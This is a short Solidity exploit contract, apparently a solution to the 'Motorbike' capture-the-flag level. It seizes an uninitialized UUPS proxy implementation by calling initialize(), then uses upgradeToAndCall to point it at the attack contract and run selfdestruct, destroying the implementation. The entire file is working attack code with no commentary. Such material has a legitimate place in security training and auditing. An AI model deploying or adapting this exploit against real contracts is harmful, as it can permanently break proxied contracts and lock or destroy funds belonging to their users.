// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract MyMotorbikeAttack {
    function attack(address implementation) external {
        IEngine impl = IEngine(implementation);
        impl.initialize();
        impl.upgradeToAndCall(address(this), abi.encodeWithSignature("destroy()"));
    }

    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}
